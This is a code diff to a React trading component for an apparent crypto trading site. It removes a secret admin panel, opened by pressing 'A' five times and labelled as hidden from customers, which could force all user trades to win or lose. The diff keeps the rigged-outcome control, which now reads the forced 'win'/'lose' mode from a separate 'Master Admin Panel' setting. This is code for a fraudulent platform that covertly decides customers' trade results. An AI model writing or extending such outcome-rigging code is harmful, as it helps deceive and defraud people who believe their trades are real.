@@ -198,23 +198,18 @@ export default function Trade({ isOpen, onClose }) {
     return saved ? JSON.parse(saved) : DEFAULT_TRADING_LEVELS
   })
   
-  // Admin panel state (hidden from customers)
-  const [showAdminPanel, setShowAdminPanel] = useState(false)
-  const [adminKeySequence, setAdminKeySequence] = useState([])
-  
   // Admin outcome control - 'auto' = natural, 'win' = force win, 'lose' = force lose
-  // Now reads from master admin panel settings
+  // Reads from master admin panel settings
   const [outcomeControl, setOutcomeControl] = useState(() => {
     const adminControl = localStorage.getItem('adminTradeControl')
     if (adminControl) {
       const parsed = JSON.parse(adminControl)
       return parsed.mode || 'auto'
     }
-    const saved = localStorage.getItem('tradeOutcomeControl')
-    return saved || 'auto'
+    return 'auto'
   })
   
-  // Check for admin control updates
+  // Check for admin control updates from Master Admin Panel
   useEffect(() => {
     const checkAdminControl = () => {
       const adminControl = localStorage.getItem('adminTradeControl')
@@ -230,32 +225,11 @@ export default function Trade({ isOpen, onClose }) {
     return () => clearInterval(interval)
   }, [])
   
-  // Trade history for admin view
+  // Trade history
   const [tradeHistory, setTradeHistory] = useState(() => {
     const saved = localStorage.getItem('tradeHistory')
     return saved ? JSON.parse(saved) : []
   })
-  
-  // Secret admin access: Press "A" 5 times rapidly
-  useEffect(() => {
-    const handleKeyPress = (e) => {
-      if (e.key.toLowerCase() === 'a') {
-        setAdminKeySequence(prev => {
-          const newSeq = [...prev, Date.now()]
-          // Keep only presses in last 2 seconds
-          const filtered = newSeq.filter(t => Date.now() - t < 2000)
-          if (filtered.length >= 5) {
-            setShowAdminPanel(true)
-            return []
-          }
-          return filtered
-        })
-      }
-    }
-    
-    window.addEventListener('keypress', handleKeyPress)
-    return () => window.removeEventListener('keypress', handleKeyPress)
-  }, [])
   
   // Real CoinGecko prices storage
   const [coinGeckoPrices, setCoinGeckoPrices] = useState({})
@@ -423,16 +397,6 @@ export default function Trade({ isOpen, onClose }) {
     setIsTrading(false)
     setTradeResult(null)
     setTradeAmount('')
-  }
-  
-  // Admin: Update trading level
-  const updateLevel = (levelIndex, field, value) => {
-    setTradingLevels(prev => {
-      const updated = [...prev]
-      updated[levelIndex] = { ...updated[levelIndex], [field]: parseFloat(value) || 0 }
-      localStorage.setItem('tradingLevels', JSON.stringify(updated))
-      return updated
-    })
   }
   
   // Format price
@@ -624,156 +588,6 @@ export default function Trade({ isOpen, onClose }) {
             <button className="trade-again-btn" onClick={resetTrade}>
               Trade Again
             </button>
-          </div>
-        )}
-
-        {/* Admin Panel (Hidden from customers) */}
-        {showAdminPanel && (
-          <div className="admin-panel" onClick={e => e.stopPropagation()}>
-            <div className="admin-header">
-              <h3>⚙️ Admin Controls</h3>
-              <button onClick={() => setShowAdminPanel(false)}>×</button>
-            </div>
-            
-            {/* Outcome Control Section */}
-            <div className="admin-section">
-              <h4 className="admin-section-title">🎯 Trade Outcome Control</h4>
-              <p className="admin-section-desc">Control the outcome of all user trades</p>
-              <div className="outcome-control-btns">
-                <button 
-                  className={`outcome-btn auto ${outcomeControl === 'auto' ? 'active' : ''}`}
-                  onClick={() => {
-                    setOutcomeControl('auto')
-                    localStorage.setItem('tradeOutcomeControl', 'auto')
-                  }}
-                >
-                  <span className="outcome-icon">⚖️</span>
-                  <span className="outcome-label">Auto</span>
-                  <span className="outcome-desc">Natural outcome</span>
-                </button>
-                <button 
-                  className={`outcome-btn win ${outcomeControl === 'win' ? 'active' : ''}`}
-                  onClick={() => {
-                    setOutcomeControl('win')
-                    localStorage.setItem('tradeOutcomeControl', 'win')
-                  }}
-                >
-                  <span className="outcome-icon">✅</span>
-                  <span className="outcome-label">Force WIN</span>
-                  <span className="outcome-desc">All trades win</span>
-                </button>
-                <button 
-                  className={`outcome-btn lose ${outcomeControl === 'lose' ? 'active' : ''}`}
-                  onClick={() => {
-                    setOutcomeControl('lose')
-                    localStorage.setItem('tradeOutcomeControl', 'lose')
-                  }}
-                >
-                  <span className="outcome-icon">❌</span>
-                  <span className="outcome-label">Force LOSE</span>
-                  <span className="outcome-desc">All trades lose</span>
-                </button>
-              </div>
-              <div className={`current-mode ${outcomeControl}`}>
-                Current Mode: <strong>{outcomeControl === 'auto' ? 'Automatic (Natural)' : outcomeControl === 'win' ? 'Force WIN' : 'Force LOSE'}</strong>
-              </div>
-            </div>
-            
-            {/* Trade History Section */}
-            <div className="admin-section">
-              <h4 className="admin-section-title">📊 Recent Trade History</h4>
-              <div className="trade-history-list">
-                {tradeHistory.length === 0 ? (
-                  <p className="no-trades">No trades yet</p>
-                ) : (
-                  tradeHistory.slice(0, 10).map((trade, idx) => (
-                    <div key={idx} className={`trade-history-item ${trade.won ? 'won' : 'lost'}`}>
-                      <div className="trade-history-main">
-                        <span className="trade-pair">{trade.pair}</span>
-                        <span className={`trade-direction ${trade.direction}`}>
-                          {trade.direction === 'up' ? '▲' : '▼'}
-                        </span>
-                        <span className="trade-amount">${trade.amount}</span>
-                        <span className={`trade-result ${trade.won ? 'win' : 'lose'}`}>
-                          {trade.won ? `+$${trade.profit.toFixed(2)}` : `-$${Math.abs(trade.profit).toFixed(2)}`}
-                        </span>
-                        {trade.controlled && <span className="trade-controlled">⚡</span>}
-                      </div>
-                      <div className="trade-history-time">
-                        {new Date(trade.timestamp).toLocaleTimeString()}
-                      </div>
-                    </div>
-                  ))
-                )}
-              </div>
-              {tradeHistory.length > 0 && (
-                <button 
-                  className="clear-history-btn"
-                  onClick={() => {
-                    setTradeHistory([])
-                    localStorage.removeItem('tradeHistory')
-                  }}
-                >
-                  Clear History
-                </button>
-              )}
-            </div>
-            
-            {/* Level Settings Section */}
-            <div className="admin-section">
-              <h4 className="admin-section-title">📈 Level Settings</h4>
-              <div className="admin-levels">
-                {tradingLevels.map((level, index) => (
-                  <div key={level.level} className="admin-level-row">
-                    <span className="admin-level-label">Level {level.level}</span>
-                    <div className="admin-inputs">
-                      <div className="admin-field">
-                        <label>Min Capital</label>
-                        <input
-                          type="number"
-                          value={level.minCapital}
-                          onChange={(e) => updateLevel(index, 'minCapital', e.target.value)}
-                        />
-                      </div>
-                      <div className="admin-field">
-                        <label>Max Capital</label>
-                        <input
-                          type="number"
-                          value={level.maxCapital}
-                          onChange={(e) => updateLevel(index, 'maxCapital', e.target.value)}
-                        />
-                      </div>
-                      <div className="admin-field">
-                        <label>Profit %</label>
-                        <input
-                          type="number"
-                          step="0.1"
-                          value={level.profit}
-                          onChange={(e) => updateLevel(index, 'profit', e.target.value)}
-                        />
-                      </div>
-                      <div className="admin-field">
-                        <label>Duration (sec)</label>
-                        <input
-                          type="number"
-                          value={level.duration}
-                          onChange={(e) => updateLevel(index, 'duration', e.target.value)}
-                        />
-                      </div>
-                    </div>
-                  </div>
-                ))}
-              </div>
-              <button 
-                className="admin-reset-btn"
-                onClick={() => {
-                  setTradingLevels(DEFAULT_TRADING_LEVELS)
-                  localStorage.removeItem('tradingLevels')
-                }}
-              >
-                Reset Levels to Defaults
-              </button>
-            </div>
           </div>
         )}
       </div>
